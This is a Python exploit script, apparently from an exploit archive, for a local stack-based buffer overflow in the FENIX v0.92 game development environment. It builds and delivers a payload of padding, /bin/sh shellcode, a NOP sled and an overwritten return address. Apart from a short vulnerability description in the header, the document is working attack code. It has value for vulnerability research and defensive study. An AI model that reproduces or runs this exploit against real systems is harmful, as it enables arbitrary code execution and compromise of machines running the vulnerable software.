# Exploit Author: Juan Sacco - http://www.exploitpack.com <jsacco@exploitpack.com>
# Program: fenix - development environment for making 2D games
# Tested on: GNU/Linux - Kali Linux 2.0
#
# Description: FENIX v0.92 and prior is prone to a stack-based buffer overflow
# vulnerability because the application fails to perform adequate
# boundary-checks on user-supplied input.
#
# An attacker could exploit this issue to execute arbitrary code in the
# context of the application. Failed exploit attempts will result in a
# denial-of-service condition.
#
# Vendor homepage: http://fenix.divsite.net/
# Kali Linux 2.0 package: http.kali.org_kali_dists_sana_main_binary-i386_Packages
# MD5: 38bc1c509eb023c24a58cda0c5db19d9


import os,subprocess
def run():
  try:
    print "# FENIX v0.92 Stack-BoF by Juan Sacco"
    print "# Wasting CPU clocks on unusable exploits"
    print "# This exploit is for educational purposes only"
    # Basic structure: JUNK + SHELLCODE + NOPS + EIP
    junk = "\x41"*4
    shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    nops = "\x90"*254
    eip = "\x44\xd2\xff\xbf"
    subprocess.call(["fenix-fxi", junk + shellcode + nops + eip])

  except OSError as e:
    if e.errno == os.errno.ENOENT:
        print "FENIX not found!"
    else:
        print "Error executing exploit"
    raise

def howtousage():
  print "Sorry, something went wrong"
  sys.exit(-1)

if __name__ == '__main__':
  try:
    print "Exploit FENIX v0.92 Local Overflow Exploit"
    print "Author: Juan Sacco"
  except IndexError:
    howtousage()
run()